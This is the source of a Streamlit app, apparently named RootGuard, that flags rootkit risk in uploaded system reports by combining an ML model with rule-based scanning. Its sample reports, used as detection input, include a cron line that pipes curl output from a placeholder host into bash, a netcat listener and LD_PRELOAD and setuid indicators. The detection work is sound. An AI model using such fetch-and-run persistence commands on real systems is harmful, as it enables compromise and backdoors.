from __future__ import annotations

import pandas as pd
import streamlit as st

from src.rootguard.config import MODEL_PATH
from src.rootguard.data import generate_synthetic_incidents, load_sample_data
from src.rootguard.features import validate_features
from src.rootguard.model import load_model, save_model, train_model
from src.rootguard.scanner import parse_feature_text, scan_text


st.set_page_config(page_title="RootGuard", page_icon=":shield:", layout="wide")


@st.cache_resource
def get_model():
    if not MODEL_PATH.exists():
        try:
            data = pd.concat(
                [generate_synthetic_incidents(n_samples=1200, random_state=42), load_sample_data()],
                ignore_index=True,
            )
        except FileNotFoundError:
            data = generate_synthetic_incidents(n_samples=1200, random_state=42)
        model, _ = train_model(data, random_state=42)
        save_model(model, MODEL_PATH)
    return load_model(MODEL_PATH)


model = get_model()

st.title("RootGuard")
st.caption("AI-based rootkit risk detection from binary and numeric system report files")

uploaded_file = st.file_uploader(
    "Upload a .txt/.log report with 0/1 security flags and numeric signals",
    type=["txt", "log"],
)

example = st.selectbox(
    "Or try a sample report",
    [
        "None",
        "Clean system report",
        "Clean developer machine",
        "Suspicious rootkit report",
        "Threat: hidden kernel module",
        "Threat: reverse shell",
        "Threat: LD_PRELOAD persistence",
        "Threat: log tampering",
        "Binary clean machine",
        "Binary high-risk rootkit",
        "Binary medium-risk rootkit",
    ],
)

sample_text = ""
if example == "Clean system report":
    sample_text = """System Health Report
Hostname: lab-machine-01
Kernel modules checked: no suspicious module found
Open ports reviewed: only ssh and http are expected
Authentication logs checked: no suspicious login activity
Cron jobs reviewed: no unknown startup task
Result: System appears healthy
"""
elif example == "Suspicious rootkit report":
    sample_text = """Incident Report
Hostname: prod-web-02
rkhunter warning: suspicious file properties found
Unknown kernel module observed during memory inspection
/etc/ld.so.preload contains unexpected preload hook
Process 1842 is running from a deleted executable
Unauthorized listener found, possible reverse shell
auth.log modified and shell history cleared
Suspicious cron entry: @reboot curl http://example.invalid/a.sh | bash
"""
elif example == "Clean developer machine":
    sample_text = """System Health Report
Host: developer-laptop-07
Date: 2026-10-07

Checks:
- Kernel modules reviewed with no suspicious module found
- Login history contains normal user sessions
- No unexpected startup service found
- Open ports match approved developer tools
- Cron jobs reviewed and verified

Conclusion:
No suspicious security indicators detected. The system looks good.
"""
elif example == "Threat: hidden kernel module":
    sample_text = """Linux Rootkit Scan Report
Host: college-lab-server-03
Date: 2026-10-07

Findings:
- Unknown kernel module observed during memory inspection
- lsmod mismatch found between /proc/modules and kernel memory
- hidden module suspected by rkhunter warning
- Process 2231 is running from a deleted executable
- audit log disabled for 14 minutes during suspicious activity

Conclusion:
Rootkit risk detected. Immediate forensic investigation recommended.
"""
elif example == "Threat: reverse shell":
    sample_text = """Security Incident Report
Host: web-prod-01
Date: 2026-10-07

Network Findings:
- Unauthorized listener found on port 4444
- Possible reverse shell connection from unknown IP
- netcat listener detected using nc -l
- Shell history cleared after suspicious login
- auth.log modified after privilege escalation

Conclusion:
High risk activity detected. This machine may be compromised.
"""
elif example == "Threat: LD_PRELOAD persistence":
    sample_text = """System Integrity Report
Host: db-node-02
Date: 2026-10-07

File Integrity Findings:
- /etc/ld.so.preload contains unexpected preload hook
- LD_PRELOAD hook observed for ps and netstat commands
- Suspicious cron entry: @reboot curl http://example.invalid/update.sh | bash
- setuid root binary found in /tmp/.cache
- chmod 4777 used on unknown executable

Conclusion:
Rootkit-like persistence found. Risk level is high.
"""
elif example == "Threat: log tampering":
    sample_text = """Audit Review Report
Host: finance-app-04
Date: 2026-10-07

Audit Findings:
- auth.log modified during unusual login period
- wtmp deleted before system reboot
- history cleared for root user
- deleted executable still linked to running process
- suspicious cron task found under root crontab

Conclusion:
Suspicious activity found. Manual review required.
"""
elif example == "Binary clean machine":
    sample_text = """sample_id=clean_001
binary_feature_vector=00000000000000000000000000000000
hidden_module=0
kernel_hook=0
lsmod_mismatch=0
syscall_table_modified=0
ld_preload_hook=0
library_injection=0
suid_binary=0
setuid_root=0
cron_persistence=0
startup_persistence=0
reverse_shell=0
bind_shell=0
unauthorized_listener=0
backdoor_port=0
log_tampering=0
history_cleared=0
audit_disabled=0
wtmp_deleted=0
latency_ms=120
cpu_usage=35
memory_usage=48
suspicious_port_count=0
deleted_process_count=0
failed_login_count=2
privilege_escalation_count=0
"""
elif example == "Binary high-risk rootkit":
    sample_text = """sample_id=threat_001
binary_feature_vector=10110111100110101111010011101011
hidden_module=1
kernel_hook=1
lsmod_mismatch=1
syscall_table_modified=1
ld_preload_hook=1
library_injection=1
suid_binary=1
setuid_root=1
cron_persistence=1
startup_persistence=1
reverse_shell=1
bind_shell=0
unauthorized_listener=1
backdoor_port=1
log_tampering=1
history_cleared=1
audit_disabled=1
wtmp_deleted=1
latency_ms=920
cpu_usage=86
memory_usage=91
suspicious_port_count=4
deleted_process_count=2
failed_login_count=28
privilege_escalation_count=3
"""
elif example == "Binary medium-risk rootkit":
    sample_text = """sample_id=threat_002
binary_feature_vector=00100101000100010010000100010010
hidden_module=0
kernel_hook=0
lsmod_mismatch=1
syscall_table_modified=0
ld_preload_hook=1
library_injection=0
suid_binary=0
setuid_root=0
cron_persistence=1
startup_persistence=0
reverse_shell=0
bind_shell=0
unauthorized_listener=1
backdoor_port=0
log_tampering=1
history_cleared=0
audit_disabled=0
wtmp_deleted=0
latency_ms=640
cpu_usage=71
memory_usage=76
suspicious_port_count=2
deleted_process_count=0
failed_login_count=13
privilege_escalation_count=0
"""

file_text = ""
if uploaded_file is not None:
    file_text = uploaded_file.read().decode("utf-8", errors="replace")

text_to_scan = file_text or sample_text

left, right = st.columns([1.05, 0.95])

with left:
    st.subheader("Uploaded Text")
    text_to_scan = st.text_area(
        "Text to scan",
        value=text_to_scan,
        height=360,
        placeholder="Upload a .txt/.log file or paste system report text here.",
        label_visibility="collapsed",
    )

with right:
    st.subheader("Scan Result")

    if not text_to_scan.strip():
        st.info("Upload or paste a text file to start the scan.")
    else:
        result = scan_text(text_to_scan)
        features = parse_feature_text(text_to_scan)
        feature_frame = validate_features(pd.DataFrame([features]))
        model_prediction = model.predict(feature_frame)[0]
        model_probability = model.predict_proba(feature_frame)[0]
        model_confidence = float(model_probability.max())

        if model_prediction == "normal" and result["risk_level"] == "Clean":
            st.success("System is good: No rootkit risk detected.")
        elif model_prediction == "normal":
            st.warning("Low risk indicators found. Review recommended.")
        elif result["risk_level"] in ["Medium", "Low"]:
            st.warning("Suspicious activity found. Investigation recommended.")
        else:
            st.error("Rootkit risk detected. Immediate investigation recommended.")

        st.metric("ML prediction", str(model_prediction).title())
        st.metric("ML confidence", f"{model_confidence:.1%}")
        st.metric("Rule verdict", result["verdict"])
        st.metric("Risk level", result["risk_level"])
        st.metric("Risk score", result["risk_score"])

        st.write("Scan summary")
        st.dataframe(
            pd.DataFrame(
                [
                    {
                        "lines_scanned": result["lines_scanned"],
                        "characters_scanned": result["characters_scanned"],
                        "indicators_found": len(result["indicators_found"]),
                    }
                ]
            ),
            use_container_width=True,
            hide_index=True,
        )

        if result["indicators_found"]:
            st.write("Detected indicators")
            st.dataframe(
                pd.DataFrame(result["indicators_found"]),
                use_container_width=True,
                hide_index=True,
            )
        else:
            st.write("No suspicious rootkit indicators were found in the uploaded text.")
